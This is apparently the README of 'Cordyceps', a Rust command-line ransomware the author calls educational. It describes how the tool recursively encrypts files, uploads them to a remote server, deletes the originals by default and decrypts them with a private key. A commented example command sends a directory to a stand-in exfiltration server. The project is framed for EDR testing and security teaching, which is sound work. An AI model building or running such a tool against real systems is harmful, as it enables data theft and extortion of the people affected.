# Cordyceps
**Cordyceps** is an educational, Rust-based command-line **ransomware** designed for academic and research purposes. It demonstrates the core mechanisms of file encryption, exfiltration, and decryption using modern cryptographic practices.

> [!CAUTION]
> This project is intended **strictly for educational use** in information security courses, penetration testing labs, or research environments. Unauthorized use of this tool—especially outside of controlled, lawful contexts—may be illegal and unethical. The author disclaim any responsibility for misuse or harm resulting from this software.


## What is Cordyceps?
Cordyceps simulates the behavior of a typical ransomware: it encrypts files on a target machine, exfiltrates them to a remote server, and allows for their recovery via decryption—assuming possession of the correct private key material. It is designed for educational use in understanding ransomware internals and for testing endpoint detection and response (EDR) tools in controlled, ethical environments.


## Purpose
Cordyceps was developed as a hands-on learning project to build practical skills in Rust—specifically around command-line interface design, networking, and data serialization—while experimenting with hybrid cryptographic schemes like ECIES (Elliptic Curve Integrated Encryption Scheme), and implementing public-key-based key management. Additionally, it serves as a tool for analyzing ransomware behavior and testing the detection capabilities of endpoint security solutions like EDRs in controlled environments.

It provides a practical platform for studying:
- **Data Exfiltration**: Recursively encrypts files from a specified directory and securely transmits them to a remote server over HTTP/HTTPS.
- **Key Management and Hybrid Cryptography**: Uses AES-256-GCM for content encryption and ECIES (based on Ed25519) for secure key exchange with Perfect Forward Secrecy.
- **Ransomware Behavior Simulation**: Demonstrates the core logic of ransomware operations, from payload execution to encryption and optional file removal.
- **Data Recovery**: Decrypts `.zombie` files back to their original form using the appropriate private key.
- **Security Tool Evaluation**: Enables testing of EDRs and behavioral detection systems by providing realistic ransomware-like behavior in a safe, reproducible manner.

> [!CAUTION]
> Cordyceps is not intended for use against real-world systems without explicit legal authorization. It is designed for educational and research purposes only, within ethical and controlled settings.


## Key Features
- 🔒 **Strong Cryptography**: Uses **AES-256-GCM** for file encryption and **ECIES (Ed25519)** for secure key exchange with Perfect Forward Secrecy.
- 📁 **Recursive File Handling**: Automatically walks through directories, encrypts eligible files, and optionally deletes the original plaintext versions.
- 🌐 **Secure Network Exfiltration**: Transmits encrypted data over **HTTP** or **HTTPS** with support for target path specification and basic error handling.
- 🔄 **Dual Operation Modes**: Supports both `encrypt` and `decrypt` commands for flexible operation.
- 🧟 **`.zombie` Format**: Each encrypted file is stored in a custom `.zombie` format containing:
  - Ephemeral public key
  - Encrypted symmetric key
  - Initialization vector (IV)
  - Ciphertext


## Ethical Use Notice
This project is a **technical demonstration**, not a weapon. Do not use Cordyceps outside of environments where you have full authorization and consent (e.g., your own machine, a test lab, or a sandbox). Misuse can carry severe legal consequences and violate ethical standards in cybersecurity.


## Installation
```
# TODO: Provide installation instructions (e.g., cargo install, build from source)
# Example:
# git clone https://github.com/your-username/cordyceps.git
# cd cordyceps
# cargo build --release
# cp target/release/cordyceps /usr/local/bin/
```


## Usage
Cordyceps operates via command-line arguments, allowing flexible control over its behavior.

### Command Line Options
- `-m, --mode <MODE>`: Sets the tool's operation. Choose `encrypt` to encrypt and send files, or `decrypt` to restore `.zombie` files. (Default: `encryption`)
- `-p, --path <DIRECTORY>`: Specifies the starting directory for file processing. (Default: current directory `.`)
- `-n, --no-delete`: (Encryption only) Prevents the original file from being deleted after successful encryption and transmission. (Default: `false`, original file is deleted)
- `-s, --server <ADDRESS>`: (Encryption only) The URL of the server to send encrypted files to (e.g., `https://your.exfil.server:8443`). (Default: `http://localhost:8080`)
- `-t, --target-folder <FOLDER_NAME>`: (Encryption only) Designates a specific subfolder on the remote server for uploaded files (e.g., `my_laptop_data`).
- `-k, --key <PATH>`: (Decryption only) Provides the file path to the server's private key (e.g., `server_ed25519_private.key`), essential for decryption. (Default: `server_ed25519_private.key`)

### Encryption Example
```
# TODO: Provide a clear example for encryption mode
# Example:
# cordyceps -m encryption -p /path/to/sensitive_data --server https://your.exfil.server:8443 -t my_laptop_data
```

### Decryption Example
```
# TODO: Provide a clear example for decryption mode
# Example:
# cordyceps -m decryption -p /path/to/zombie_files -k /path/to/your/server_private_key.bin
```


## Key Management
- **Server Public Key**: For encryption operations, the server's ED25519 public key is securely embedded directly into the Cordyceps binary during compilation. This key is used to establish the shared secret for encrypting the AES key.
- **Server Private Key**: For decryption operations, the corresponding ED25519 private key must be explicitly provided by the user via the `--key` CLI option. **It is paramount to keep this private key highly secure and never distribute it with the client application.**


## Contributing
I welcome contributions to Cordyceps! If you're interested in improving this project, here's how you can get started:
1. **Open an Issue**: Before diving into code, please open an [issue](https://github.com/lopes/cordyceps/issues) to discuss the bug you've found or the feature you'd like to propose. This helps me ensure alignment with the project's scope and avoids duplicate efforts.
2. **Code Style**: I follow standard Rust formatting (using `rustfmt`) and adhere to idiomatic Rust practices. Please ensure your code is formatted correctly before submitting.
3. **Project Scope**: Be mindful of the project's core purpose as a secure file encryption/exfiltration/decryption tool. Features that fall outside this scope may be declined.
4. **Pull Requests**: Once your changes are ready, submit a [pull request](https://github.com/lopes/cordyceps/pulls). Please ensure your PR includes:
    - A clear description of the changes.
    - References to the relevant issue(s).
    - Tests covering your new functionality or bug fixes.


## License
This project is licensed under the [MIT License](LICENSE).
